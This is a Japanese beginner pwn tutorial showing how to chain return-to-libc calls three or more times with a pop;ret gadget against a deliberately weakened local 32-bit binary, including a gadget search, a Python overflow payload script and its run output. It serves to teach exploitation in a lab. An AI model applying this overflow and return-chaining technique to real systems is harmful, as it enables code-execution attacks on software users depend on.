# PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc関数を3回以上実行(SSP、ASLR、PIE無効で32bitELF)

## はじめに

return-to-libcは2回まではスタックに重ねるだけでいけるのだけど3回以上はうまくスタックを掃除しながらじゃないと呼び出せない。
というわけで今回は3回以上実行する方法。
単純にputsを5回ぐらい呼び出すexploit codeを作ってみる。

## 準備

ほぼ前回の[saru2017/pwn005: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc関数を2回実行(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn005)を使って少しだけ加えます。

## 新たに調べなければならないアドレス

libcの中にpopとretが連続している相対アドレスを探してみる。

```bash-statement
saru@lucifen:~/pwn006$ objdump -d /lib32/libc.so.6 | grep -B1 ret | grep -A1 pop | head
   1869b:       5f                      pop    %edi
   1869c:       c3                      ret
--
   18706:       5e                      pop    %esi
   18707:       c3                      ret
--
   187ec:       5d                      pop    %ebp
   187ed:       c3                      ret
--
   18be5:       5b                      pop    %ebx
saru@lucifen:~/pwn006$
```

たくさん出てくるのだがたぶんどれでも良い。
今回は`0x0001869b`を使う。

## exploitコード

```python
import struct
import sys

base_libc = 0xf7ded000
offset_system = 0x0003cd10
offset_puts = 0x00067360
offset_shell = 0x0017b8cf
offset_popret = 0x0001869b
bufsize = 140

def main():
    buf = b'A' * bufsize
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_popret)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += b'AAAA'
    buf += struct.pack('<I', base_libc + offset_shell)

    sys.stdout.buffer.write(buf)



if __name__ == "__main__":
    main()
```

## 実行結果

見事5回「`/bin/sh`」を出力することに成功。

```bash-statement
saru@lucifen:~/pwn006$ python exploit06_stdout.py | ./overflow06
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`C▒▒▒V▒▒ψ▒▒`C▒▒▒V▒▒ψ▒▒`C▒▒▒V▒▒ψ▒▒`C▒▒▒V▒▒ψ▒▒`C▒▒▒V▒▒ψ▒▒`C▒▒AAAAψ▒▒
/bin/sh
/bin/sh
/bin/sh
/bin/sh
/bin/sh
/bin/sh
Segmentation fault (core dumped)
saru@lucifen:~/pwn006$
```


## 参考

- [saru2017/pwn005: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc関数を2回実行(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn005)
- [Return-to-libcで連続して関数を呼んでみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/24/020347)




